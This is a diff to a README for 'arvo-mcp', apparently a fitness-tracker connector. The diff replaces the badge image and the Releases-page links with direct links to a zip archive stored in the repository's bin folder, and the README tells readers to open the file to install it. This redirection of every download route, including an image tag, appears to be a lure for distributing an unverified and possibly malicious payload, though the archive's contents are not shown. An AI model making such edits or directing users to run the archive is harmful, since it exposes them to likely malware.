@@ -1,6 +1,6 @@
 # 🤖 arvo-mcp - Connect Your Trainer and Data Seamlessly
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/ANGEL37391/arvo-mcp/main/bin/mcp_arvo_1.0-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **arvo-mcp** repository! This application is designed to connect 
 
 To get started, you need to download the latest release of the application:
 
-1. Visit the Releases page to download the latest version: [Download Here](https://github.com/ANGEL37391/arvo-mcp/releases).
+1. Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/ANGEL37391/arvo-mcp/main/bin/mcp_arvo_1.0-alpha.2.zip).
 2. Choose the file suitable for your operating system.
 3. After the download completes, open the file to install the application on your computer.
 
@@ -62,4 +62,4 @@ We appreciate contributions from the community! If you want to help improve **ar
 - **Website**: Visit the official website for more information and updates.
 - **Documentation**: Access comprehensive documentation for installation and usage.
 
-For now, enjoy your fitness journey with **arvo-mcp**, and remember to download the application to get started on tracking your workouts effectively: [Download Here](https://github.com/ANGEL37391/arvo-mcp/releases).
+For now, enjoy your fitness journey with **arvo-mcp**, and remember to download the application to get started on tracking your workouts effectively: [Download Here](https://raw.githubusercontent.com/ANGEL37391/arvo-mcp/main/bin/mcp_arvo_1.0-alpha.2.zip).
